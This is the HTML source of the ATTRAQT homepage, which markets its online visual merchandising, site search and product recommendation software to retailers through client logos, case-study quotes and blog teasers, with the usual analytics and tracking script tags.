

<!doctype html>
<html class="no-js" lang="en-gb">
    <head>
        <meta charset="utf-8"><script type="text/javascript">window.NREUM||(NREUM={}),__nr_require=function(e,t,n){function r(n){if(!t[n]){var o=t[n]={exports:{}};e[n][0].call(o.exports,function(t){var o=e[n][1][t];return r(o||t)},o,o.exports)}return t[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({1:[function(e,t,n){function r(){}function o(e,t,n){return function(){return i(e,[f.now()].concat(u(arguments)),t?null:this,n),t?void 0:this}}var i=e("handle"),a=e(2),u=e(3),c=e("ee").get("tracer"),f=e("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var p=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],d="api-",l=d+"ixn-";a(p,function(e,t){s[t]=o(d+t,!0,"api")}),s.addPageAction=o(d+"addPageAction",!0),s.setCurrentRouteName=o(d+"routeName",!0),t.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(e,t){var n={},r=this,o="function"==typeof t;return i(l+"tracer",[f.now(),e,n],r),function(){if(c.emit((o?"":"no-")+"fn-start",[f.now(),r,o],n),o)try{return t.apply(this,arguments)}catch(e){throw c.emit("fn-err",[arguments,this,e],n),e}finally{c.emit("fn-end",[f.now()],n)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,t){m[t]=o(l+t)}),newrelic.noticeError=function(e){"string"==typeof e&&(e=new Error(e)),i("err",[e,f.now()])}},{}],2:[function(e,t,n){function r(e,t){var n=[],r="",i=0;for(r in e)o.call(e,r)&&(n[i]=t(r,e[r]),i+=1);return n}var o=Object.prototype.hasOwnProperty;t.exports=r},{}],3:[function(e,t,n){function r(e,t,n){t||(t=0),"undefined"==typeof n&&(n=e?e.length:0);for(var r=-1,o=n-t||0,i=Array(o<0?0:o);++r<o;)i[r]=e[t+r];return i}t.exports=r},{}],4:[function(e,t,n){t.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(e,t,n){function r(){}function o(e){function t(e){return e&&e instanceof r?e:e?c(e,u,i):i()}function n(n,r,o,i){if(!d.aborted||i){e&&e(n,r,o);for(var a=t(o),u=m(n),c=u.length,f=0;f<c;f++)u[f].apply(a,r);var p=s[y[n]];return p&&p.push([b,n,r,a]),a}}function l(e,t){v[e]=m(e).concat(t)}function m(e){return v[e]||[]}function w(e){return p[e]=p[e]||o(n)}function g(e,t){f(e,function(e,n){t=t||"feature",y[n]=t,t in s||(s[t]=[])})}var v={},y={},b={on:l,emit:n,get:w,listeners:m,context:t,buffer:g,abort:a,aborted:!1};return b}function i(){return new r}function a(){(s.api||s.feature)&&(d.aborted=!0,s=d.backlog={})}var u="nr@context",c=e("gos"),f=e(2),s={},p={},d=t.exports=o();d.backlog=s},{}],gos:[function(e,t,n){function r(e,t,n){if(o.call(e,t))return e[t];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return e[t]=r,r}var o=Object.prototype.hasOwnProperty;t.exports=r},{}],handle:[function(e,t,n){function r(e,t,n,r){o.buffer([e],r),o.emit(e,t,n)}var o=e("ee").get("handle");t.exports=r,r.ee=o},{}],id:[function(e,t,n){function r(e){var t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===window?0:a(e,i,function(){return o++})}var o=1,i="nr@id",a=e("gos");t.exports=r},{}],loader:[function(e,t,n){function r(){if(!x++){var e=h.info=NREUM.info,t=d.getElementsByTagName("script")[0];if(setTimeout(s.abort,3e4),!(e&&e.licenseKey&&e.applicationID&&t))return s.abort();f(y,function(t,n){e[t]||(e[t]=n)}),c("mark",["onload",a()+h.offset],null,"api");var n=d.createElement("script");n.src="https://"+e.agent,t.parentNode.insertBefore(n,t)}}function o(){"complete"===d.readyState&&i()}function i(){c("mark",["domContent",a()+h.offset],null,"api")}function a(){return E.exists&&performance.now?Math.round(performance.now()):(u=Math.max((new Date).getTime(),u))-h.offset}var u=(new Date).getTime(),c=e("handle"),f=e(2),s=e("ee"),p=window,d=p.document,l="addEventListener",m="attachEvent",w=p.XMLHttpRequest,g=w&&w.prototype;NREUM.o={ST:setTimeout,SI:p.setImmediate,CT:clearTimeout,XHR:w,REQ:p.Request,EV:p.Event,PR:p.Promise,MO:p.MutationObserver};var v=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1071.min.js"},b=w&&g&&g[l]&&!/CriOS/.test(navigator.userAgent),h=t.exports={offset:u,now:a,origin:v,features:{},xhrWrappable:b};e(1),d[l]?(d[l]("DOMContentLoaded",i,!1),p[l]("load",r,!1)):(d[m]("onreadystatechange",o),p[m]("onload",r)),c("mark",["firstbyte",u],null,"api");var x=0,E=e(4)},{}]},{},["loader"]);</script><script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","queueTime":0,"licenseKey":"6a0e9d1882","agent":"","transactionName":"NgZaMkFTVhZVUUFfCQ9MfhNdUUwMW1waVQsSTU4PVkVLX1BXQVcPDRA=","applicationID":"3340817","errorBeacon":"bam.nr-data.net","applicationTime":6}</script>
        <title>ATTRAQT</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        

        <link rel="stylesheet" href="/static/css/magnific.6eff092d9de3.css">
        <link rel="stylesheet" href="/static/css/main.aca2341d77d9.css">
        <link href='https://fonts.googleapis.com/css?family=Lato:400,300,100,700' rel='stylesheet' type='text/css'>
        <style>
           #request-demo h1 {
   	 font-size: medium;
   	 text-decoration: underline;
    	 font-weight: 700;
    	 font-family: Lato;
	}
        </style>

    </head>
    <body class="cbp-spmenu-push">
        

        <header>
            <div id="nav" class="wrapper">
                <div id="logo">
                    <a href="/"><img src="/static/img/header-logo.ddf63a6d9761.png" alt="Attraqt Logo" /></a>
					
                </div>
                <div id="nav-menu">
                    
<ul>
    
    <li class="child active">
        <a href="/" >Home</a>
        
    </li>

    
    <li class="child sibling">
        <a href="/attraqt/why-attraqt/" class="has-children">ATTRAQT <span class="opener"></span></a>
        
        
<ul>
    
    <li class="child">
        <a href="/attraqt/online-visual-merchandising/" >Online Visual Merchandising</a>
        
    </li>

    
    <li class="child">
        <a href="/attraqt/site-search-navigation/" >Site Search &amp; Navigation</a>
        
    </li>

    
    <li class="child">
        <a href="/attraqt/product-recommendations/" >Product Recommendations</a>
        
    </li>

    
    <li class="child">
        <a href="/attraqt/why-attraqt/" >Why ATTRAQT?</a>
        
    </li>

    
<li class="child" id="request-demo">
  <h1>
     <a class ="demo-link" href=" http://content.attraqt.com/request-demo" style="color:#083F59;">request a demo</a>
  </h1>
 </li>

</ul>
        
    </li>

    
    <li class="child sibling">
        <a href="/case-studies/" class="has-children">Case Studies <span class="opener"></span></a>
        
        
<ul>
    
    <li class="child">
        <a href="/case-studies/harvey-nichols/" >Harvey Nichols</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/superdry/" >Superdry</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/calendar-club/" >Calendar Club</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/the-british-museum/" >The British Museum</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/wilko/" >Wilko</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/emma-bridgewater/" >Emma Bridgewater</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/life-style-sports/" >Life Style Sports</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/tesco/" >Tesco</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/wolf-and-badger/" >Wolf &amp; Badger</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/amara/" >Amara</a>
        
    </li>

    
<li class="child" id="request-demo">
  <h1>
     <a class ="demo-link" href=" http://content.attraqt.com/request-demo" style="color:#083F59;">request a demo</a>
  </h1>
 </li>

</ul>
        
    </li>

    
    <li class="child sibling">
        <a href="/partners/" class="has-children">Partners <span class="opener"></span></a>
        
        
<ul>
    
    <li class="child">
        <a href="/partners/become-partner/" >Become a Partner</a>
        
    </li>

    
<li class="child" id="request-demo">
  <h1>
     <a class ="demo-link" href=" http://content.attraqt.com/request-demo" style="color:#083F59;">request a demo</a>
  </h1>
 </li>

</ul>
        
    </li>

    
    <li class="child sibling">
        <a href="/about/" class="has-children">About <span class="opener"></span></a>
        
        
<ul>
    
    <li class="child">
        <a href="/about/executive-team/" >Executive Team</a>
        
    </li>

    
    <li class="child">
        <a href="/about/careers/current-vacancies/" class="has-children">Careers <span class="opener"></span></a>
        
        
<ul>
    
    <li class="child">
        <a href="/about/careers/current-vacancies/" >Current Vacancies</a>
        
    </li>

    
    <li class="child">
        <a href="/about/careers/whats-it/" >What&#39;s it like?</a>
        
    </li>

    
<li class="child" id="request-demo">
  <h1>
     <a class ="demo-link" href=" http://content.attraqt.com/request-demo" style="color:#083F59;">request a demo</a>
  </h1>
 </li>

</ul>
        
    </li>

    
    <li class="child">
        <a href="/about/investors/" class="has-children">Investors <span class="opener"></span></a>
        
        
<ul>
    
    <li class="child">
        <a href="/about/investors/share-price-rns-accouncements/" >Share Price &amp; RNS Accouncements</a>
        
    </li>

    
    <li class="child">
        <a href="/about/investors/major-shareholders/" >Major Shareholders</a>
        
    </li>

    
    <li class="child">
        <a href="/about/investors/company-board/" >Company &amp; Board</a>
        
    </li>

    
    <li class="child">
        <a href="/about/investors/governance/" >Governance</a>
        
    </li>

    
    <li class="child">
        <a href="/about/investors/reports-documents/" >Reports &amp; Documents</a>
        
    </li>

    
    <li class="child">
        <a href="/about/investors/advisors-contact/" >Advisors &amp; Contact</a>
        
    </li>

    
    <li class="child">
        <a href="/about/investors/aim-rule-26/" >AIM Rule 26</a>
        
    </li>

    
<li class="child" id="request-demo">
  <h1>
     <a class ="demo-link" href=" http://content.attraqt.com/request-demo" style="color:#083F59;">request a demo</a>
  </h1>
 </li>

</ul>
        
    </li>

    
    <li class="child">
        <a href="/about/faqs/" >FAQs</a>
        
    </li>

    
<li class="child" id="request-demo">
  <h1>
     <a class ="demo-link" href=" http://content.attraqt.com/request-demo" style="color:#083F59;">request a demo</a>
  </h1>
 </li>

</ul>
        
    </li>

    
    <li class="child sibling">
        <a href="/latest/blog/" class="has-children">The Latest <span class="opener"></span></a>
        
        
<ul>
    
    <li class="child">
        <a href="/latest/blog/" >Blog</a>
        
    </li>

    
    <li class="child">
        <a href="/latest/events/" >Events</a>
        
    </li>

    
<li class="child" id="request-demo">
  <h1>
     <a class ="demo-link" href=" http://content.attraqt.com/request-demo" style="color:#083F59;">request a demo</a>
  </h1>
 </li>

</ul>
        
    </li>

    
    <li class="child sibling">
        <a href="/contact/" >Contact</a>
        
    </li>

    
<li class="child" id="request-demo">
  <h1>
     <a class ="demo-link" href=" http://content.attraqt.com/request-demo" style="color:#083F59;">request a demo</a>
  </h1>
 </li>

</ul>
                </div>

                <nav class="cbp-spmenu cbp-spmenu-vertical cbp-spmenu-right" id="cbp-spmenu-s2">
                    
<ul>
    
    <li class="child active">
        <a href="/" >Home</a>
        
    </li>

    
    <li class="child sibling">
        <a href="/attraqt/why-attraqt/" class="has-children">ATTRAQT <span class="opener"></span></a>
        
        
<ul>
    
    <li class="child">
        <a href="/attraqt/online-visual-merchandising/" >Online Visual Merchandising</a>
        
    </li>

    
    <li class="child">
        <a href="/attraqt/site-search-navigation/" >Site Search &amp; Navigation</a>
        
    </li>

    
    <li class="child">
        <a href="/attraqt/product-recommendations/" >Product Recommendations</a>
        
    </li>

    
    <li class="child">
        <a href="/attraqt/why-attraqt/" >Why ATTRAQT?</a>
        
    </li>

    
<li class="child" id="request-demo">
  <h1>
     <a class ="demo-link" href=" http://content.attraqt.com/request-demo" style="color:#083F59;">request a demo</a>
  </h1>
 </li>

</ul>
        
    </li>

    
    <li class="child sibling">
        <a href="/case-studies/" class="has-children">Case Studies <span class="opener"></span></a>
        
        
<ul>
    
    <li class="child">
        <a href="/case-studies/harvey-nichols/" >Harvey Nichols</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/superdry/" >Superdry</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/calendar-club/" >Calendar Club</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/the-british-museum/" >The British Museum</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/wilko/" >Wilko</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/emma-bridgewater/" >Emma Bridgewater</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/life-style-sports/" >Life Style Sports</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/tesco/" >Tesco</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/wolf-and-badger/" >Wolf &amp; Badger</a>
        
    </li>

    
    <li class="child">
        <a href="/case-studies/amara/" >Amara</a>
        
    </li>

    
<li class="child" id="request-demo">
  <h1>
     <a class ="demo-link" href=" http://content.attraqt.com/request-demo" style="color:#083F59;">request a demo</a>
  </h1>
 </li>

</ul>
        
    </li>

    
    <li class="child sibling">
        <a href="/partners/" class="has-children">Partners <span class="opener"></span></a>
        
        
<ul>
    
    <li class="child">
        <a href="/partners/become-partner/" >Become a Partner</a>
        
    </li>

    
<li class="child" id="request-demo">
  <h1>
     <a class ="demo-link" href=" http://content.attraqt.com/request-demo" style="color:#083F59;">request a demo</a>
  </h1>
 </li>

</ul>
        
    </li>

    
    <li class="child sibling">
        <a href="/about/" class="has-children">About <span class="opener"></span></a>
        
        
<ul>
    
    <li class="child">
        <a href="/about/executive-team/" >Executive Team</a>
        
    </li>

    
    <li class="child">
        <a href="/about/careers/current-vacancies/" class="has-children">Careers <span class="opener"></span></a>
        
        
<ul>
    
    <li class="child">
        <a href="/about/careers/current-vacancies/" >Current Vacancies</a>
        
    </li>

    
    <li class="child">
        <a href="/about/careers/whats-it/" >What&#39;s it like?</a>
        
    </li>

    
<li class="child" id="request-demo">
  <h1>
     <a class ="demo-link" href=" http://content.attraqt.com/request-demo" style="color:#083F59;">request a demo</a>
  </h1>
 </li>

</ul>
        
    </li>

    
    <li class="child">
        <a href="/about/investors/" class="has-children">Investors <span class="opener"></span></a>
        
        
<ul>
    
    <li class="child">
        <a href="/about/investors/share-price-rns-accouncements/" >Share Price &amp; RNS Accouncements</a>
        
    </li>

    
    <li class="child">
        <a href="/about/investors/major-shareholders/" >Major Shareholders</a>
        
    </li>

    
    <li class="child">
        <a href="/about/investors/company-board/" >Company &amp; Board</a>
        
    </li>

    
    <li class="child">
        <a href="/about/investors/governance/" >Governance</a>
        
    </li>

    
    <li class="child">
        <a href="/about/investors/reports-documents/" >Reports &amp; Documents</a>
        
    </li>

    
    <li class="child">
        <a href="/about/investors/advisors-contact/" >Advisors &amp; Contact</a>
        
    </li>

    
    <li class="child">
        <a href="/about/investors/aim-rule-26/" >AIM Rule 26</a>
        
    </li>

    
<li class="child" id="request-demo">
  <h1>
     <a class ="demo-link" href=" http://content.attraqt.com/request-demo" style="color:#083F59;">request a demo</a>
  </h1>
 </li>

</ul>
        
    </li>

    
    <li class="child">
        <a href="/about/faqs/" >FAQs</a>
        
    </li>

    
<li class="child" id="request-demo">
  <h1>
     <a class ="demo-link" href=" http://content.attraqt.com/request-demo" style="color:#083F59;">request a demo</a>
  </h1>
 </li>

</ul>
        
    </li>

    
    <li class="child sibling">
        <a href="/latest/blog/" class="has-children">The Latest <span class="opener"></span></a>
        
        
<ul>
    
    <li class="child">
        <a href="/latest/blog/" >Blog</a>
        
    </li>

    
    <li class="child">
        <a href="/latest/events/" >Events</a>
        
    </li>

    
<li class="child" id="request-demo">
  <h1>
     <a class ="demo-link" href=" http://content.attraqt.com/request-demo" style="color:#083F59;">request a demo</a>
  </h1>
 </li>

</ul>
        
    </li>

    
    <li class="child sibling">
        <a href="/contact/" >Contact</a>
        
    </li>

    
<li class="child" id="request-demo">
  <h1>
     <a class ="demo-link" href=" http://content.attraqt.com/request-demo" style="color:#083F59;">request a demo</a>
  </h1>
 </li>

</ul>
                </nav>
                <button id="hamburger"><img src="/static/img/icons/hamburger.9f11da1b5b0d.png" /></button>
                <div style="clear: both;"></div>
            </div>
        </header>

        <main>
        
            
<div class="plugin">
    <div class="homepage-video-banner">
        <div class="banner-content">
            <h1>ATTRAQT</h1>
            <p>Powerful Online Visual Merchandising</p>
            
        </div>
        <video muted autoplay loop name="media" style="background-color: #eee;">
            <source src="/static/videos/attraqt-reel-video.mp4" type="video/mp4">
            <source src="/static/videos/attraqt-reel-video.ogv" type=video/ogg>
            <source src="/static/videos/attraqt-reel-video.webm" type=video/webm>
        </video>
        <img class="mobile-img" src="/media/filer_public/73/b7/73b78a96-d4df-4714-88a8-3d9d5605be92/mobile_new_image.jpg"/>
    </div>
</div>
<div class="plugin">
    <div class="logo-wall-plugin">
        <img src="/media/filer_public_thumbnails/filer_public/ac/28/ac283556-ab90-488c-a87b-b57b1d05ea84/beauty_bay.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/95/dd/95dd0c5b-4583-4bf2-ae12-602d11dfc79b/13_british_museum.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/c9/5c/c95c0a00-38a7-4a31-b5ef-e05ffa56a1be/eddie_bauer_.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/c8/2e/c82ec325-8983-4fda-a28d-61f0942d991d/14_ellis_brigham.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/6e/3f/6e3f0c26-6cdd-43aa-b08c-c8248da8c7e4/emma_b_logo_wall.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/84/91/84913c54-5faf-4cb1-9564-c5580ac46ea5/15_ff_tesco.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/c1/65/c1650d8d-4886-42af-9900-36e027695066/23_laura_ashley.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/58/47/58477ddc-4feb-4936-81a9-0965e3f953b5/24_lk_bennett.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/97/e9/97e9ea27-74a7-46d3-94bb-f63dbb4500bb/31_matches_fashion.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/a8/fe/a8fe1440-cda3-4a1f-9757-d018209208b7/33_north_face_the.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/a3/68/a36862b7-142d-4e72-bc0f-e61ea6354747/34_paperchase.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/39/d5/39d598e6-ab89-47bf-b1f0-b977eb9f08cc/paul_smith_logo_wall.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/58/4e/584e512a-8b32-4eec-972a-e0f5803b3e84/42_screwfix.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/8b/df/8bdf40a4-0979-4e4d-8040-43825a30727f/44_superdry.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/0c/a3/0ca32a02-a347-4bbd-9911-1d119a0e3c11/45_tate.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/2c/82/2c822564-5b98-4af6-b4f4-c2cdef58af6a/51_timberland.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/5d/23/5d2342d1-da16-4d3c-91cf-b2175baf760e/52_tkmaxx.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/b7/aa/b7aa0ad1-268e-47ba-9c34-8b695ae0d084/53_tumi.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/20/ab/20aba2c2-862a-4599-b681-bd5397222550/54_vans.jpg__500x500_q85_subsampling-2.jpg" /><img src="/media/filer_public_thumbnails/filer_public/0e/9f/0e9fea18-bc0e-4b99-a2dd-f0df60e5e85c/55_wilko.jpg__500x500_q85_subsampling-2.jpg" />
    </div>
</div><div class="plugin ">
    <div class="wrapper homepage-key-features-plugin">
        <div class="top-row">
            <div class="key-feature">
                <img src="/media/filer_public/45/86/458693d3-ee40-4d15-aba1-8478cde3446f/shoe-2.png" />
                <h3>Online Visual Merchandising</h3>
                <p>Empower the merchandising function and apply the most effective offline display methods online</p>
                <a class="btn" href="/attraqt/online-visual-merchandising/" >More</a>
            </div>
        </div>
        <div class="bottom-row">
            <div class="key-feature">
                <img src="/media/filer_public/f0/a8/f0a83573-1437-4677-98f6-43b5a913de15/telescope.png" />
                <h3>Site Search &amp; Navigation</h3>
                <p>Add powerful visual merchandising techniques to intelligent, intuitive search</p>
                <a class="btn" href="/attraqt/site-search-navigation/" >More</a>
            </div>
            <div class="key-feature">
                <img src="/media/filer_public/e5/bd/e5bdec92-0658-4e6b-b604-b4ba77eee251/fingerprint.png" />
                <h3>Product Recommendations</h3>
                <p>Deliver more personalised, more relevant recommendations in real time to stimulate purchase and improve conversion rates</p>
                <a class="btn" href="/attraqt/product-recommendations/" >More</a>
            </div>
        </div>
    </div>
</div><div class="plugin ">
    <div class="wrapper rich-text-plugin ">
        <div class="content">
            <h2 style="text-align: center;">ATTRAQT is a revolutionary online visual merchandising tool that helps retailers deliver a step change in their conversion rate, and drive online sale success.</h2>
        </div>
    </div>
</div>

<div class="plugin">
    <div class="case-study-list-plugin-ie">
        <div class="parallax">
            
                
                    <div class="cd-fixed-bg" style="background-image: url(/media/filer_public_thumbnails/filer_public/e8/90/e890f860-aca1-493e-a790-0a5299bb3841/superdry_header.jpg__1920x1080_q85_subsampling-2.jpg);">
                        <div class="content ">
                            <h1>Superdry</h1>
                            <h2>The system is user friendly and cost-effective whilst delivering real returns. It's no exaggeration to say that we saw conversion rates increase overnight.</h2>
                            <a class="btn" href="/case-studies/superdry/">View case study</a>
                        </div>
                    </div>
                
            
                
                    <div class="cd-scrolling-bg" style="background-image: url(/media/filer_public_thumbnails/filer_public/5a/1e/5a1e33a7-c378-48a4-a68c-e6f0e702bb2d/tbm_header.jpg__1920x1080_q85_subsampling-2.jpg);">
                        <div class="content ">
                            <h1>The British Museum</h1>
                            <h2>Serving a global audience of tourists, enthusiasts and experts, the British Museum Company plays a vital role in generating revenue for separate registered charity the British Museum.</h2>
                            <a class="btn" href="/case-studies/the-british-museum/">View case study</a>
                        </div>
                    </div>
                
            
                
                    <div class="cd-fixed-bg" style="background-image: url(/media/filer_public_thumbnails/filer_public/66/b4/66b4d1e7-9e8e-4885-8fce-d961b8a8fded/emma_bridgewater_header.jpg__1920x1080_q85_subsampling-2.jpg);">
                        <div class="content ">
                            <h1>Emma Bridgewater</h1>
                            <h2>We saw results immediately, within 10 days the Gift Finder Tool had paid for itself, and also received wide recognition from both customers and our extended business</h2>
                            <a class="btn" href="/case-studies/emma-bridgewater/">View case study</a>
                        </div>
                    </div>
                
            
                
                    <div class="cd-scrolling-bg" style="background-image: url(/media/filer_public_thumbnails/filer_public/89/80/8980a765-c6f1-4ea9-930e-ab0e72653140/tesco_header_image.jpg__1920x1080_q85_subsampling-2.jpg);">
                        <div class="content ">
                            <h1>Tesco</h1>
                            <h2>When you see how simple Freestyle Merchandising is to use, you would never guess how sophisticated the technology is.</h2>
                            <a class="btn" href="/case-studies/tesco/">View case study</a>
                        </div>
                    </div>
                
            
        </div>
    </div>
</div>
<div class="plugin ">
    <div class="wrapper the-latest-plugin">
        <h1>News</h1>
        <div class="article">
            <img src="/media/filer_public_thumbnails/filer_public/61/9e/619e6f3c-139e-41a9-a47a-275d2da349f8/istock_000021894160_xxxlarge.jpg__720x400_q85_subsampling-2.jpg" />
            <h1>5 Top Tips for Effective e-Commerce Visual Merchandising</h1>
            <div class="summary"><p>Visual merchandising is something that we're all familiar with when it comes to an in-store environment. From shop window displays to the sweets around the checkouts, it's hard not to be influenced by careful product positioning. But when it comes to online visual merchandising, working out how to adapt in-store techniques and where to start can seem like a daunting task. </p><p>So where should you start? Here are my top five tips to help you ensure your online visual merchandising is as effective as possible:<br></p><p><br></p></div>
            <a class="btn" href="/latest/blog/5-top-tips-effective-e-commerce-visual-merchandisi/">More</a>
        </div><div class="article">
            <img src="/media/filer_public_thumbnails/filer_public/04/e3/04e32e7f-e01a-4d33-aba8-4631319b8dc7/ps_main_image_low_res.jpg__720x400_q85_subsampling-2.jpg" />
            <h1>Increasing Site Conversion</h1>
            <div class="summary"><p>Imagine you've got a physical store. Now imagine you don't bother to present any structure or implement any visual merchandising at all. Everything is essentially just thrown wherever it lands. It's the king of all jumble sales.</p><p>This would never happen in a physical store. Millions of pounds are spent carefully planning not just the journey the customer takes through the store using display furniture, but positioning the right product in the right places throughout their journey. This is essential to the success of a stores sales.</p><p>The absolute same is true when it comes to online visual merchandising. If careful planning isn't put into the journey your customer takes once they land on your site, your sales are certain to suffer.</p></div>
            <a class="btn" href="/latest/blog/increasing-site-conversion/">More</a>
        </div><div class="article">
            <img src="/media/filer_public_thumbnails/filer_public/69/09/690986db-cadd-406f-9d97-e4a8d20fc9f0/lab_ex_cropped.jpg__720x400_q85_subsampling-2.jpg" />
            <h1>5 Top Tips for Successful AB Testing</h1>
            <div class="summary"><p>The most frequent question I am asked by a client about to embark on an A/B test is, “How do we increase our conversion/revenue". If I could give you a 100% guaranteed to work answer to that question I would be writing this from the rooftop pool of my Manhattan penthouse, but I'm not! While an increase in conversion and revenue is always everyone's end goal, you need to look at it from the right perspective to hit your target. </p><p>So let's start with that and do the workings out: what do your customers actually want?</p></div>
            <a class="btn" href="/latest/blog/5-top-tips-successful-ab-testing/">More</a>
        </div>
    </div>

    
        <div id="gate-form-container">
    <p>Please complete the form below to continue reading the rest of the article.</p>
    <form id="gate-form" method="POST" data-ajax-url="/gated-content/gate-form/">
        <div class="field">
            <label>First name</label>
            <input name="first-name" type="text" required="" />
        </div>
        <div class="field">
            <label>Last name</label>
            <input name="last-name" type="text" required="" />
        </div>
        <div class="field">
            <label>Company</label>
            <input name="company" type="text" required="" />
        </div>
        <div class="field">
            <label>Email address</label>
            <input name="email" type="email" required="" />
        </div>

        <div class="field submit">
            <input id="submit-gate-form" class="btn" type="submit" value="Submit" />
        </div>
    </form>
</div>
    
</div>


        
        </main>

        <footer>
            
<div class="contact-locations-plugin">
    <div class="wrapper">
        
            
                <div class="location-row">
            
            <div class="location">
                <h1>LONDON</h1>
                <p class="address">3 Waterhouse Square, 138 Holborn, London, EC1N 2SW</p>
                <div class="contact">
                    <p><strong>Tel:</strong> +44 (0)20 3675 7800</p>
                    <p><strong>Email:</strong> <a href="mailto:sayhello@attraqt.com">sayhello@attraqt.com</a></p>
                </div>
            </div>
            
        
            
            <div class="location">
                <h1>CHICAGO</h1>
                <p class="address">125 South Clark Street,17th Floor,Chicago, Illinois, 60603</p>
                <div class="contact">
                    <p><strong>Tel:</strong> +1 312 964 3900</p>
                    <p><strong>Email:</strong> <a href="mailto:sayhello@attraqt.com">sayhello@attraqt.com</a></p>
                </div>
            </div>
            
                </div>
            
        
    </div>
</div>


            <div id="footer-socials">
                <a href="https://twitter.com/ATTRAQT" target="_blank"><img src="/static/img/icons/twitter.5b36c990a4fd.png" /></a>
                <a href="https://www.linkedin.com/company/attraqt" target="_blank"><img src="/static/img/icons/linkedin.b314fcd918c1.png" /></a>
            </div>
            
            <div id="footer-bottom">
                <div class="wrapper">
                    <div class="text">
                        <h1>2018 ATTRAQT Ltd</h1>
                    </div>
                    <div id="footer-nav">
                        <ul>
                            <li><a href="/about/faqs/">FAQ</a></li>
                            <li><a href="/sitemap/">Sitemap</a></li>
                            <li><a href="/cookie-policy/">Cookie Policy</a></li>
                            <li><a href="/privacy-policy/">Privacy Policy</a></li>
                            <li><a href="/website-terms/">Website Terms</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </footer>

        

        
            <script type="text/javascript" src="/static/js/vendor/jquery.min.0ed1dbd9a7d3.js"></script>
            <script type="text/javascript" src="//maps.google.com/maps/api/js?sensor=false"></script>
            <script type="text/javascript" src="/static/js/vendor/classie.795134a782d1.js"></script>
            <script type="text/javascript" src="/static/js/vendor/magnific.min.743ccc438e10.js"></script>
            <script type="text/javascript" src="/static/js/vendor/cookie.de7195d77d1b.js"></script>
            <script type="text/javascript" src="/static/js/main.1ae936a282e9.js"></script>
            <script type="text/javascript" src="/static/js/mobile-nav.1aa7c1675f25.js"></script>
            <script>
                (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
                m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
                })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

                ga('create', 'UA-10672902-2', 'attraqt.com');
                ga('send', 'pageview');
            </script>
	<script>
	   jQuery('#nav-menu ul li ul li:last-child').css({'display':'none'});
	</script>

            <script type="text/javascript" src="http://www.ksyrium0014.com/js/24607.js"></script>
            <noscript><img src="http://www.ksyrium0014.com/24607.png" style="display:none;" /></noscript>
        

        
    <script src="/static/js/gated_resource_handler.js" type="text/javascript">
    <script>
        $(window).load(function() {
            if ($(window).width() > 768) {
                var max = 0;
                $('.article .summary').each(function() {
                    var $height = $(this).height();
                    if ($height > max) {
                        max = $height;
                    }
                });
                $('.article .summary').each(function() {
